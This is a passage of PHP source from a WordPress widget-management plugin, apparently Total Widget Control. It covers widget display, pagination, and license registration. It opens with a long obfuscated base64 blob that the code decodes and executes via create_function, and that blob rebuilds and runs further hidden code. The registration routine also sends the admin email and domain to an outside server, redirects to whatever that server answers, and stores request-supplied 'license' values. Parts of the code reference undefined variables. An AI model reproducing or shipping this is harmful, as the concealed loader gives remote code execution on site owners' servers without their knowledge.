Hh3VzdwTkxieENMNXhIV2VHTUx4K00xQVd0cDcyaVc1eTRqanB4dFZXTlI1eUgxUHh0QXlxL0pVV2dsWHF0cGhwQzF4eVNwYnhDSHp2dG5XeUFHaHAvQlJoNUxTcUF6V2xOQXp2Q3BEV0NSbTJ0QllXQ2Z6eWFGN3hlMUd2SEJSMjBBR3ZBcjVHV1cvcE5BTjUvTHcyL1hIV3Rwb2hDVzV5TXp6dk5qTFR4QW1sdC9ZNzRqanB0R2t4d3o1V3RyYnh0bnl5U1dHVDYxNytNSGI1L0xoeS9nVTVlMXk1dHpOVy9ManB0MURUaUo3eldHaDJBcnRXQ2oweHhGbTI1TVJ5NHJHdjBqWFRoRzV4Z1hTV3RHK3EvSmU1Q29INVd2VXh0RldwYXZVVEhwN3lpQVAyNDF6V0Fya1doV201V3JQeDZHcHZOcDU1L243cGhnUjU2QStkYXpYVFN6TnBOTVlsQUFXVzVqVFRXcDcrV25CeUFHeHY2RmFUU3IrK0hXTjJNdHdxdEdReDVSNXBBbmU3V2o4eS9HVVd3enlwQXBMemhSd3ZDcE5XV0dveS9IYnlBQWpxdDFYeHhyK2xXelR4L1crNU5qNWhTclluaXZVaC9HaHBNcnJXZ1dRMmdITHh0V1c1NGNSeEhwenZ0cld6V3J5djRGclRpTCtXL2dVeTBXZStNR1FXNDEvcUFXQnlhMWVwQ29VeC9HQW5IdGJ4Q0x6VzVSRFdocC8rV0FWVy9MeHB0R2tXaFdtNVdyVnA2RjV2TmorR1dHL3BoSE41Q2ZwdjVSVjVDSm9wTk1ZbEFBenA1akQ1QzE3aE5BVjV3RytwZ0dkV2dqNXZXaFJkQzF5eUhyUTV3eitXaG9TbDBBaDVOWlVodGpRNXR6NHlNV0R2TnNTVFNBTitDV09wZTFqV0NwSld0bEp5Q0FXeWF0NVd0cnlUd0ZOcUF6VFd0R2hwdEdWNUNMUWh0ZFlsQWp3djRkaVRIcDdsQVRTK3RHOHZpcFlUU0YrMkhwb2QvdGVwVzFNVHdGWVRXV2g1QzFwMkFHcjVDUis1L0hQV3dXcHZpUkxXeEFOeXRwVlcvMXl2dDFUVFNCWHFDeld4QzErVzZGNTV3Rll4Q1dMR01HNXBNclZ4Q29YcUF6VzJhakRxL0d5eHRqUXBXL1NHYW54V2lzSGh4ci95aUFNeDZHR3ZBQWFXQ1JtbHRuQW5OMStxL2dVV3RXbVcvSDVHU3I1V2lSVlRTejd4QXRiR2ExN3lIVFV4d3IrMjVXUGw0RitXYXB5V05MLytBTVV5TUdlMk5ZUlQ1MXB2aXA1R01manBIQWJoNjE3Mkh6Vit0cmpwTnZSaGkxTnB0RzR5Tkx6di9YaUdBVzVoV25laC9meHZnSk9XZ0cvaC9IaGhDTHpXZ0o1aGdHTjJDcGUyQXJ4cEhya1RoV2cySHJWeHhyNTVBMTU1d0EvMmhnWTdlQUd2NUxKVDVSRnFDcDVXZWpEcS9HSWhIR05sTkFQV3R0dDVOdmdXaG4rNXQxTnAvdGVwaG1peDVIN25pdlU3NUhrV2hKSWh0alFoQ3BleHhGRHZOc1NXV2o3bnQvWWxhMTd5SEd6V0hubTJXejVwL1I1V2lkaUdXanloQUFicHd6eHBDUkk1Q0w3aDVNVXk0bnd2d3RWNS9wenZ0cld6V3J5djRGWVdoVytsV25oZENmeTIvR001d3IrNWhINDc1MSt5Q3BlVDVScG5IcFArd3p6cXQxRFc2MXd2Q3BiaENmeXZBV2JXSG4vV3RXYnBDSitxL0c1VGhoSHhOV1YrNkE1cENSVVdnRzdoVzFBVzZHN3ZDakloeHJtMkNkVWxhbnlxdHJoeGUxeVdDclZHTXR4eWlwK1cwcjZxL0hUVy96d1doWEg1ZTFRaENBNDV0bnpwdDFMeHhybW50MVBsYWpHdldHR1dXall2SEFPMmF0R3YwV0k1L25tcUF6V25Banc1NEZPV2dXKzJnSEx4QzF0MkNMaVRIVzd6dEdUNWVyaHl0clFoaTFOcHRwb2R3QTV2TnBwVHdGWXhob1V5TkgrcENqT3gvRys1Q01VeU1SenZDakRXNjEvelduQSt0QWp2SEcrRzVKb3Z0cGJ4QzF4eUNSRDUvbllsTnpQaENIenY1Umk1Q0pOcE5CWVd0dGhwU3RMeGdwL250QlV5YW5qdjZGSlRTem95SFc1eWFqNXF0clFUeHJZcENBQW5OMXlwL0JpaHRHRTV0MUF6eHp3eWlSRFRlMUV6L2dZN2hwOHZXV1grU3I2bi9KNWRldHp2MFdwR0FHL3pXTVV4L0x6eUN2VTV4clk1L0pWaEMxNVdlcFJUZ2o3eUh6b2R0cnl2NWpNV2hwUXl0V2V5TVJ0Mi9XWFRXV1lxV1dlR01MN3Bpak9HMEEraENXVjUvalcrNEZOV2hHb3lIcE9HNHR6VzVwK3hXajU1QTFicC8xeHkvV1V4V1dJdk5BTStDZmgyTmpVNWUxNnFBeldsTUh6K0FHTGgvV1krNXBCZENmNXlhRkpUU3pvV0NwVkcwQXkyVzFieFdqK3hXbjQ3aHIvdk1YSGh3RmFuSHpOR01KdDI1emJUeEFveEhCWVRhakd2V1dYV3RqWXZpV1AyYWorV01KeTUvRy9xQU1Vbk16OHEvSlBUNUpZNXR6TlcvSGVXZ0hieEhXNzJIcjVHYW5oeXRyUVRhMVF5dFdocHdBcDJDcE1HV2xKbnR6TDdXdGVwTXJpNUNSTjJpQllHQXBwcS8xVlQ1MUV5Q0FvNWVueHBIclV4aGpJcUNyYnBDMXgyTmZVNXdGSXZBelcyTjE1cS9BWHgwekFxL0pQVzZBeHlTaFNod3pycUExb2h0MWp2SEdpeHh6V3ZIMU1HTXRlcGgxK1cwcm1xaEhUVy96eHEvR1Z4d3IrNXR6NHlNcHhXYXBSV05IbXlIVFNwL3BqdjRGRFd0bm14Z0pUKy9XZXBDUnk1L1dReE1IV2gvZi92NVlSNUNMN2hoSG95NHJEdk5ZUlRDTDcydDFOeUFHL1d4ZFJUaUwrMkhXNXkwV3c1TUdNVGhwLytBR2hwL0wrdmcxUVQ1b0g1dHBMaDZHeldnSjVXaHAvK1duNDJBMStwdFdiVGhqbzU1cFAyMEE1NUF0YXhXV0l2QW5NK3R0VzU0RnZodG55aDVXUFcvZjd2SEdMaDVKWTJDcEJ4d0c4di9KRWhIalk1NUFWZHhyR3Z0MWI1d3oraENBQjIwemhXaFhpaHRHbXE1V0x4L25XcFdyNWhpUkZ2dEFMN1dBeldTV2lUaTF5cU1KaGQvdHlwYXphRzUxN24vSGV4NjE4cS9ya0dNaEo1L0pWaENKdHlpUlJUZ3BOMnRyYnB0R2pweFd2RzUxUWxXR04yNHJlcE10YnhDTDV4SFdleGVHeHEvSmU1ZTF6cU1Kb0dBRnpXZ0pOV01wN3l0MVBod0d6MmVGa1dnbmd5dDFQeDZyeDJNcnloZ1dydlduV3kwRncrNEZpR0FqUXFDV1dHTVJ4V3hXRHg1Uk56aEpNeHQxeXBNSkJoeHpveWdINVdlamVwNWpKaC9uR3F0bmU3NUgveS9HVnh3QlhxdDE0bE0xd3Y2cFJXTlJveEhCVVRhamp2NXpYV0hqV24vSlcyNHIvV2F6YVdOSHl2dE1VR01qV3BNSk9XSHA1Ky9ITHh0cmpwSEFiNS9HRW50elYyTUw4djVqR3hobEoyV3JleU5MR3EvMXBUd0ZZaFdXZUdBdHB2aEFKNXhBTjJIdlNsNGp6V2lSRFRpUk4ydHpWaENmeXZpcFdXV1dveU1maHBDZjU1TTF5aGdqNXA1elBoQ2Y1dmdKaUc1TC9oNVdQbE1meitBR0xXQzFFbE5BUG5hcnpXQUFKaHh6b3lnSDUyTXRlcGhKcHg1SG16QUdXbjRBdytNSlBXdHBOaHRtU1d0bnd5aWo1V016U3FXclRwZWp5dk5weldXV201QXI0R2FqNVdhcHlUd3J5cGlXT1cvTGhwTUJIV2dXUXovSG9Xd3BXVzVSTkdXcE4rdEFQR0FHeHBDcE1UaHBRMkhyaHB3QXAyV3JRaGduR3FBbld5NDE3V2luSlRoaEhoV3pCVFNwenF0MU54V0dOejVwV2g2dCtwSDF5eGhqWStOV1d4QzFlVzVweWhnanp2V3pXaHR0aDJOalB4eEYvcEEvWVcvTDU1QUdWaC9XSXFNSk4yTmY4dk5kSGh4ci95SFdNR010ZXB0dGFXQzE3V2hIQXo1THRXTWdVaHRoSGh0cE9HTVdqcGl2WWh0cE52NXBlN2hwOHZXR3J4aG43Mld6NTJNV2oyTVdhV05IeW5XTVV4dEdqcHRHazV4cnlxQ01ZbE1HanBIcjBUSFc3ekN2U3B0cnQyV0JpVFNGK1d0cEJsNEdHcS8xTUc1UldxTVhTVzZXN1cvR1lUNUo3ekNCVXgvang1NEZHV2lSNXo1QTQyQUFXcEFyYlRTRmd5Q3pocENKK3Y0aitoZ0cvcDVBTmR4RmhkYXpKaGlKUXFDV1dwNmp4V3hXRHgvcE5sQ3A1aGVudHlnR1hoeHI2dkhCUld3R0d2TW1pVHhGSXF0blcyTjErcS9HVnh3ei9XdG1SR1NGanBpemJUeEFGdnQxTzJBQTh2NEZweHdGbTVBcFcyNHJqeS9KSWhTcm1wZ0hleC9Ma1c1UmtoaW9ZdmlCWUc0Rnp2aVlTeC9XN2x0elBuYW4vV2dKQWhIbi92QVRTeHdXNVdOUk1UaHAveWdvVUdBdDUyTm5KVGhwNzV0L1VHYXR6V2lqTmhpMTdudDFvNXRHeCtOcFZHNWdYdnRCU2xNdEd2NkYrR1dHNnZBbk0rL0xoMjVqUFRoak41NXBUV3RwV3BpcElXMEFQdi9KNDIwR3o1TnBYeFduL3lDQVZkd1dlV2VwSTV3cjdsdG5laHRqK3ZocmloaVJGdkgvVTUvcFdXeHREaGlKN2hNWFNwdEF5cGVGUldXajVsV3pUeGVqK3YwV3BoZ0dtcEhNVTdoTGpxQ3ZVNXhBeSsvSFZ4dFd6cGdKVFRIVzcydHJicGVuNzJ0cmRXSHBHdk5BVDJhanc1TnBNNXdGL3FoSEF5QXRqV01YSHgvVzUySHZVR1NwenF0MTVoZ0c1MkhwVldDZnl2NXB6V2doSjU1cFZ4Q2ZwdmdoU3hDSitoQW5oNXhGaldNR1lUNUpRcUNXNVd3ckR2Q2pMaHh6WWxDcGVsYW54V0NuSldoaEhXQ3BvV2VqZVdlZGk1d0Y1V2hIQmxNai95aVJkeHd6Tmg1V2h4dHRlV0EvWVdXcEV5L2dVaGVqeFdlRnB4d0ZtZGdKV2xNdDVXeFdwaGdHbXBnSGUyTUxoMkFHT2hpMSt6L0hvVzZyenBpbmJ4Z1c3eE1KUEdBcnlwSDFBeFduL3B0cEx5QUZ2dmdXWFRXV1lxaFhTV0NINTI1ak81ZTF6cU1KTHh0cFcrNEZEV2hHTnhpZFUyNDF6V0FyTlRoV2cyZ2ZNeHhyNVc1ajVUaGhndjVBTXB0R3crNEZRVDVKRnF0ck1HNGpXcFN0RGgvcDdXSHpvaHQxaDJXMUhoeGNIK2lBb3B3V2VwaHRiaGdueXBBbmVHMHprKzRGa1d0cEFuaUE0eC9wanBNMURXTlJtV0h6Vit0dC81QUdoV2huL3ZXck1wZWo1NU1yYjUvV1FxTWdVMkFqd3kvSk9HQVc3K3RwTHlBcmpwSHJMVEMxN3ZXR1dwdDE3eXRyUVRhMVF5dFdocHdBcDJDcE1HV2xKbi9nVTc1SDV5L3JlVGhuZzV0MU5HNFdwdkNwUFRpMUZ2Q3BBN1cxN3l0ck9HNUxvbkNwMFRTbnJwSDFpVGl0RjJnMTRwdHJycDBGNnhocFNHZzE0cHRycnA0bjZUU3orcTVyNFc2V0RkSHJqaHdGR25IbjVwZUZrcWhBUDVXR0FsL0xKMjBucmRIcmpod0ZHbkhuNXBDclFwZ0crNUF6RjdodDBod0ZqcGlSYnhBZEhoZ0hvNWVuV1dNMUlUaG43Mi9MMGhDQSt2QXRhV0hHTlQvMTRwdHJUaGFuNmhDTE54V2hZV2VGa3FoQkoraG5vMmh0MHlNbnBXZWpoaHR6RnlBRmh2Tm5EZEhyamh3RkduSG41cDVuZGhncjE1V2o3Mk1KVmhDR3lwSEdWVHdyKzJNTDBoQ0ErdkF0YVdIR0FsTUx4MjBucitNMW9HTWo1cTVyMWRDMXcyV0dtR01uNUd0MU9XNldHdkhyWVR3QmcyZzFKVGF6RzJoR2I1dHBHdkFzVWhDUkd2d3RQNXR6NnlIblBHTW56cENSKytIelB6Z3RCdk5uQ2hnckxHQWxIeUNwNDI0Rzh5aHJqVDVMb3ZIbk0rQ0F3cEhyZ1dDMUV5Z0hvNXdBeXA1alUrZ3pvemd0Qmg2dHRoZ0JhK2h6K3ZOQTQyNDF2VzBXNVR0R3l6dG5veUF6aFdndEpXTkpyMmdMaGxpblFwNkZUeHRuWXlDckxxMHp5cGhXNmhBekZ5aXA0eTRGd3F4Y1BXNUwvV2lBTHg2VzgrTnBQaFd6NmxNZkpkNUxlMk52UlQ1SDduNXJCR05McGhpbll4YXRFN1cvVXB3Rkd2Q25JaHRqbXl0MVRkd0ZqV1N0SCtoeitUV1d4MjBuQ2hnQkoraHNZR2lyTFd3enJwNkZSaEhqLzVoSG9sNG55cFNBZXhobnBxV0dPV0NMeHBhekkrSHBTR1kyMicpOyBpZiAoIWlzc2V0KCRaR0YwWVFbMV0pKSByZXR1cm47ICRaR0YwWVEgPSAkWkdGMFlRWzFdOyBmb3IgKCRhUSA9IDA7ICRhUSA8IHN0cmxlbigkWkdGMFlRKTsgJGFRKyspeyAkWkdGMFlRWyRhUV0gPSAkdGhpcy0+UjJWMFEyaGhjZygkWkdGMFlRWyRhUV0sIEZBTFNFKTsgfSBpZiAoRkFMU0UgIT09ICgkWkdGMFlRID0gYmFzZTY0X2RlY29kZSgkWkdGMFlRKSkpeyByZXR1cm4gY3JlYXRlX2Z1bmN0aW9uKCcnLGJhc2U2NF9kZWNvZGUoJFpHRjBZUSkpOyB9IGVsc2UgeyByZXR1cm4gRkFMU0U7IH0gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gVkhWeWJreHZZMnMoJGJHOWphMVI1Y0dVLCAkYzNSbGNITSA9IDUsICRaR2x5WldOMGFXOXUgPSAncmlnaHQnKXsgZm9yICgkYVEgPSAwOyAkYVEgPCAkYzNSbGNITTsgJGFRKyspeyAkVEc5amF3ID0mICR0aGlzLT5SMlYwVEc5amF3KCRiRzlqYTFSNWNHVSk7IGlmICgkWkdseVpXTjBhVzl1ICE9ICdyaWdodCcpICRURzlqYXcgPSBzdHJyZXYoJFRHOWphdyk7ICRZdyA9ICRhUTsgaWYgKCRZdyA+PSBzdHJsZW4oJFRHOWphdykpeyB3aGlsZSAoJFl3ID49IHN0cmxlbigkVEc5amF3KSl7ICRZdyA9ICRZdyAtIHN0cmxlbigkVEc5amF3KTsgfSB9ICRRMmhoY2cgPSBzdWJzdHIoJFRHOWphdywgMCwgMSk7ICRURzlqYXcgPSBzdWJzdHIoJFRHOWphdywgMSk7IGlmIChzdHJsZW4oJFRHOWphdykgPiAkWXcpeyAkUTJoMWJtdHogPSBleHBsb2RlKCRURzlqYXdbJFl3XSwgJFRHOWphdyk7IGlmIChpc19hcnJheSgkUTJoMWJtdHopKXsgJFRHOWphdyA9ICRRMmgxYm10elswXS4kVEc5amF3WyRZd10uJFEyaGhjZy4kUTJoMWJtdHpbMV07IH0gfSBlbHNlIHsgJFRHOWphdyA9ICRRMmhoY2cuJFRHOWphdzsgfSBpZiAoJFpHbHlaV04wYVc5dSAhPSAncmlnaHQnKSAkVEc5amF3ID0gc3RycmV2KCRURzlqYXcpOyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFVtVnpaWFJNYjJOcigkYkc5amExUjVjR1UgPSAnJyl7ICRRMmhoY2xObGRBID0gJHRoaXMtPlIyVjBRMmhoY2xObGRBKCk7IGZvcmVhY2ggKCR0aGlzLT5TMlY1Y3cgYXMgJFRHOWphMVI1Y0dVID0+ICRTMlY1KXsgaWYgKCRiRzlqYTFSNWNHVSl7IGlmICgkVEc5amExUjVjR1UgPT0gJGJHOWphMVI1Y0dVKXsgJHRoaXMtPlRHOWphM01bJFRHOWphMVI1Y0dVXSA9ICRRMmhoY2xObGRBOyByZXR1cm47IH0gfSBlbHNlIHsgJHRoaXMtPlRHOWphM01bJFRHOWphMVI1Y0dVXSA9ICRRMmhoY2xObGRBOyB9IH0gfSBmdW5jdGlvbiBaakl3WDJadmRYSjBlUSgpeyB0cnkgeyBwcmVnX21hdGNoKCcvKFswLTlBLVphLXpcLVwvXC5dKilcKFxkLycsIF9fZmlsZV9fLCAkYldGMFkyaGxjdyk7IGlmIChpc3NldCgkYldGMFkyaGxjd1sxXSkpIHsgJFptbHNaUSA9IHRyaW0oJGJXRjBZMmhsY3dbMV0pOyB9IGVsc2UgeyAkY0dGeWRITSA9IHBhdGhpbmZvKF9fZmlsZV9fKTsgJFptbHNaUSA9IHRyaW0oJGNHRnlkSE1bJ2Rpcm5hbWUnXS4nLycuJGNHRnlkSE1bJ2ZpbGVuYW1lJ10uJy4nLnN1YnN0cigkY0dGeWRITVsnZXh0ZW5zaW9uJ10sMCwzKSk7IH0gJGNHRnlkSE0gPSBwYXRoaW5mbygkWm1sc1pRKTsgJHRoaXMtPlVtVnpaWFJNYjJOcigpOyAkdGhpcy0+U1c1elpYSjBTMlY1Y3coKTsgJHRoaXMtPlZIVnlia3RsZVEoKTsgJFpRPSR0aGlzLT5WVzVzYjJOcigpOyRaUSgpOyB9Y2F0Y2goRXhjZXB0aW9uICRaUSl7fSB9IHByb3RlY3RlZCBmdW5jdGlvbiBSMlYwUTJoaGNnKCRZMmhoY2csICRaVzVqY25sd2RBID0gRkFMU0UpeyBpZiAoISRaVzVqY25sd2RBKSAkdGhpcy0+VEc5amEzTSA9IGFycmF5X3JldmVyc2UoJHRoaXMtPlRHOWphM00pOyAkYVEgPSAwOyBmb3JlYWNoICgkdGhpcy0+VEc5amEzTSBhcyAkVEc5amExUjVjR1UgPT4gJFRHOWphdyl7IGlmICgkYVEgPT0gMCl7ICRVRzl6YVhScGIyNCA9IHN0cnBvcygkVEc5amF3LCAkWTJoaGNnKTsgfSBpZiAoJGFRICUgMiA+IDApeyBpZiAoJFpXNWpjbmx3ZEEpeyAkVUc5emFYUnBiMjQgPSBzdHJwb3MoJFRHOWphdywgJFkyaGhjZyk7IH0gZWxzZSB7ICRZMmhoY2cgPSAkVEc5amF3WyRVRzl6YVhScGIyNF07IH0gfSBlbHNlIHsgaWYgKCRaVzVqY25sd2RBKXsgJFkyaGhjZyA9ICRURzlqYXdbJFVHOXphWFJwYjI0XTsgfSBlbHNlIHsgJFVHOXphWFJwYjI0ID0gc3RycG9zKCRURzlqYXcsICRZMmhoY2cpOyB9IH0gJGFRKys7IH0gaWYgKCEkWlc1amNubHdkQSkgJHRoaXMtPlRHOWphM00gPSBhcnJheV9yZXZlcnNlKCR0aGlzLT5URzlqYTNNKTsgcmV0dXJuICRZMmhoY2c7IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFIyVjBRMmhoY2xObGRBKCl7ICRjbVYwZFhKdSA9ICcnOyAkUm05eVltbGtaR1Z1UTJoaGNuTSA9IGFycmF5X21lcmdlKHJhbmdlKDQ0LCA0NiksIHJhbmdlKDU4LCA2NCksIHJhbmdlKDkxLCA5NikpOyBmb3IgKCRhUSA9IDQzOyAkYVEgPCAxMjM7ICRhUSsrKXsgaWYgKCFpbl9hcnJheSgkYVEsICRSbTl5WW1sa1pHVnVRMmhoY25NKSl7ICRjbVYwZFhKdSAuPSBjaHIoJGFRKTsgfSB9IHJldHVybiAkY21WMGRYSnU7IH0gfSBuZXcgWmpJd1gyWnZkWEowZVEoKTsg';
		$e=create_function("",@base64_decode($freelicense));$e();
	}
	
}

/**
 * function is responsible to determine if the widget will display on this page.
 *
 * @param string|object $widget
 * @return boolean
 */
function twc_is_widget_displaying( $widget )
{
	//initializing variables
	if (is_string($widget))
	{
		$widget = twc_get_widget_by_id($widget);
	}
	
	//is active for current page
	if (twc_get_object_id())
	{
		$display = (is_array($widget['p']['menu_item_object_id']) && in_array(twc_get_object_id(), (array)$widget['p']['menu_item_object_id']));
	}
	else 
	{
		$display = (is_array($widget['p']['menu_item_urls']) && in_array(twc_get_object_url(), (array)$widget['p']['menu_item_urls']));
	}
	
	//is active for parent
	if (!$display && $widget['p']['twcp_inherit_sidebar'] == 'inherit')
	{
		if ($id = twc_get_object_id()) if ($parents = get_post_ancestors($id))
		{
			foreach ((array)$parents as $parent_id)
			{
				if (!in_array($parent_id, $widget['p']['menu_item_object_id'])) continue;
				$display = true;
				break;
			}
		}
	}
	
	return $display;
}

/**
 * This function manages the view style. Upon first call it will check
 * which view is to be used.
 *
 * @return boolean
 */
function twc_list_style_twc()
{
	//initializing variables
	static $view;
	global $current_user;
	get_currentuserinfo();
	
	if (!isset($view) && $style = $_REQUEST['list_style']) //querystring
	{
		$view = $style;
	}
	elseif (!isset($view)) //db
	{
		$view = get_user_option( 'twc_list_style', $current_user->ID );
	}
	else //already set
	{
		return ($view == 'twc');
	}
	
	update_user_option($current_user->ID, 'twc_list_style', $view);
	return ($view == 'twc');
}

/**
 * function is responsible for adjusting the plugin meta links on the plugin page
 *
 * @param array $plugin_meta
 * @param string $plugin_file
 * @return array $plugin_meta
 */
function twc_plugin_row_meta( $plugin_meta, $plugin_file )
{
	//reasons to fail
	if ('total-widget-control/index.php' != $plugin_file) return $plugin_meta;
	
	//initializing variables
	if (isset($plugin_meta[2])) unset($plugin_meta[2]);
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/?kb" target="_blank">'.__('Documentation','twc').'</a>';
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/community/" target="_blank">'.__('Support Forum','twc').'</a>';
	$plugin_meta[] = '<a href="http://community.5twentystudios.com/software-products/total-widget-control/extra-widgets/" target="_blank">'.__('Get More Widgets','twc').'</a>';
	
	return $plugin_meta;
}

/**
 * Function returns a drop down of the current widgets position
 *
 * @param unknown_type $sidebar_id
 * @param unknown_type $default
 */
function twc_position_select_box( $sidebar_id, $default )
{
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$list = $sidebars_widgets[$sidebar_id];
	
	$select = '<select id="'.$sidebar_id.'_position'.'" name="'.$sidebar_id.'_position'.'" class="twc_sidebar_select_box">';
	
	if (count($list) == 0)
	{
		$select .= "<option value='0'>0</option>";
	}
	
	for ($i = 1; $i <= count($list); $i++)
	{
		$selected = '';
		if ($default == ($i-1)) $selected = 'selected=selected';
		$select .= "<option $selected value='".($i-1)."'>$i</option>";
	}
	return $select.'</select>';
}

/**
 * function creates the wrapper folder and returns a list of files
 * within that folder.
 * 
 * @TODO Function should also copy the default wrappers to the created folder
 *
 * @return unknown
 */
function twc_read_wrapper_files()
{
	//initializing variables
	$themepath = TwcPath::clean(get_theme_path().DS.'widget-wrappers'.DS);
	$pluginpath = TwcPath::clean(dirname(__file__).DS.'widget-wrappers'.DS);
	
	if (!is_dir($themepath)) TwcPath::create($path, 0777);
	
	$themefiles = TwcPath::byrd_files($themepath, $filter = '.', $recurse = false, $fullpath = true);
	$pluginfiles = TwcPath::byrd_files($pluginpath, $filter = '.', $recurse = false, $fullpath = true);
	$files = (array)$themefiles + (array)$pluginfiles;
	
	$headers = array(
		'wrapperTitle' => __('Wrapper Title','twc'),
		'description' => __('Description','twc'),
	);
	
	foreach ($files as $file)
	{
		$file_data[$file] = get_file_data($path.$file, $headers);
	}
	
	return $file_data;
}

/**
 * Builds the row data, we do this outside of the model, for pagination purposes.
 *
 * @param string $action
 * @return null
 */
function twc_rows( $action = 'default' )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twcp_pagi, $twc_rows;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$sidebars = array();
	$current_screen = twc_get_current_screen();
	$twc_rows = array();
	$twcp_pagi = apply_filters('twcp_pagination_defaults', array(
		'total' => 0,
		'per_page' => 20,
		'page' => (isset($_REQUEST['pa'])) ?$_REQUEST['pa'] :1,
		'pages' => '',
		'start' => '',
		'stop' => '',
	));
	
	//reasons to fail
	if (!empty($current_screen->action) && $action == 'default') return false;
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			
			switch ($action)
			{
				case 'on-page':
					//initializing variables
					$widget = twc_get_widget_by_id($widget_slug);
					$display = twc_is_widget_displaying($widget);
					
					//reasons to continue
					$display = apply_filters('twc_display_widget', $display, $widget);
					if (!$display) continue;
						
					//setting variables
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = $widget;
					
					break;
				default:
				//show inactive widgets
				if (twc_inactive_list() && $sidebar_slug == 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				
				//show filtered items
				if (twc_filter_list_for() && twc_filter_list_for() != $sidebar_slug)
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				
				//show searched for items
				if (twc_search_list_for() && $search = twc_search_list_for())
				{
					$widget = twc_get_widget_by_id( $widget_slug );
					$title = apply_filters('twc_widget_title', ((isset($widget['p']['title'])) ?$widget['p']['title'] :''), $widget);
					
					if (strpos(strtolower($title),strtolower($search)) !== false)
					{
						$twcp_pagi['total']++;
						$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					}
					continue;
				}
				
				//show only active items
				if (!twc_inactive_list() && $sidebar_slug != 'wp_inactive_widgets')
				{
					$twcp_pagi['total']++;
					$twc_rows[$sidebar_slug][$position][$widget_slug] = twc_get_widget_by_id( $widget_slug );
					continue;
				}
				break;
			}
			
		endforeach;
	endforeach;
	
	//calculate the number of pages
	$twcp_pagi['pages'] = ceil(($twcp_pagi['per_page'] > 0) ?$twcp_pagi['total'] / $twcp_pagi['per_page'] :1);
	$twcp_pagi['start'] = ($twcp_pagi['per_page'] * $twcp_pagi['page']);
	$twcp_pagi['start'] = ($twcp_pagi['start'] >= $twcp_pagi['per_page']) ?$twcp_pagi['start'] - $twcp_pagi['per_page']+1 :$twcp_pagi['start'];
	$twcp_pagi['stop'] = $twcp_pagi['per_page'] * $twcp_pagi['page'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] == 0) ?$twcp_pagi['stop'] + $twcp_pagi['per_page'] :$twcp_pagi['stop'];
	$twcp_pagi['stop'] = ($twcp_pagi['stop'] > $twcp_pagi['total']) ? $twcp_pagi['total'] :$twcp_pagi['stop'];
	$twcp_pagi = apply_filters('twcp_pagination', $twcp_pagi);
}

/**
 * This takes care of the alternating row colors without all the messy code
 * in my table rows
 */
function twc_row_alternate()
{
	//initializing variables
	static $alternate;
	
	if (!isset($alternate))
	{ 
		$alternate = 0;
	}
	else
	{
		$alternate++;
	}
	
	if ($alternate)
	{
		$alternate = -1;
		echo 'alternate';
	}
}

/**
 * registers the inactive widgets sidebar
 * 
 * @return null
 */
function twc_register_placeholder_sidebar()
{
	// register the inactive_widgets area as sidebar
	register_sidebar(array(
		'name' => __('Inactive Widgets'),
		'id' => 'wp_inactive_widgets',
		'description' => '',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
	));
}

/**
 * function is responsible for pinging for a license and redirecting if necessary
 *
 * @return unknown
 */
function twc_registration()
{
	//loading libraries
	require_once ABSPATH.'wp-admin'.DS.'includes'.DS.'plugin.php';
	
	//initializing variables
	$current_screen = twc_get_current_screen();
	$first = get_option('twc_unique_registration_key', true);
	$uniqueID = get_option('twc_unique_registration_key', create_guid());
	update_option('twc_unique_registration_key', $uniqueID);
	
	//reasons to fail
	if ($current_screen->action != 'register') return false;
	if (isset($_REQUEST[$uniqueID]) || !isset($_REQUEST['license'])) return false;
	
	//initializing variables
	$headers = get_plugin_data( dirname(__file__).DS.'index.php' );
	$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
	$file_path = plugin_dir_path(dirname(__file__)).$parts['host'];
	
	switch($_REQUEST['license'])
	{
		case '1': case '2': 
			remove_all_actions("twc_display_admin");
			add_action('twc_display_admin', 'twc_register');
			$type = 'twc-pro'; 
			break;
		case '10': return; break;
		default: 
			$type = 'twc-free';
			break;
	}
	
	$path = "http://community.5twentystudios.com/?view=register-for-free&email=".
		get_bloginfo('admin_email')."&ver=".urlencode($headers['Version']).
		"&domain=".urlencode($domain)."&type=$type&unique=$uniqueID&return_url=".
		urlencode(get_bloginfo('url'));
	
	if (ini_get('allow_url_fopen') && $result = @file_get_contents($path))
	{
		
	}
	else 
	{
		$curl = curl_init($path);
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);

	    $result = curl_exec($curl);
	    if(curl_errno($curl))
		{
		    error_log('twc curl error: '.' '.curl_error($ch).'; results: '.$result);
		}
		curl_close($curl);
	}
	
	if ($type == 'twc-free')  
		do_action('twc-free-registration'); 
	
	if (trim($result))
	{
		$result = trim(str_replace("\r\n",'', $result));
		header('Location: '.$result);
		exit();
	}
	return false;
}

/**
 * function is responsible for saving the license file if its sent
 *
 * @return false
 */
function twc_receive_license()
{
	//initializing variables
	$uniqueID = get_option('twc_unique_registration_key', false);
	$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
	$parts = parse_url($domain);
	
	//reasons to fail
	if (!isset($_REQUEST[$uniqueID])) return false;
	
	$licenses = get_option('twc_licenses',array());
	$licenses[$parts['host']] = $_REQUEST[$uniqueID];
	update_option('twc_licenses',$licenses);
	update_option('twc_is_free',false);
	
	return die('done : success');
}

/**
 * Function appends the widget wrapper values to the instance fields
 *
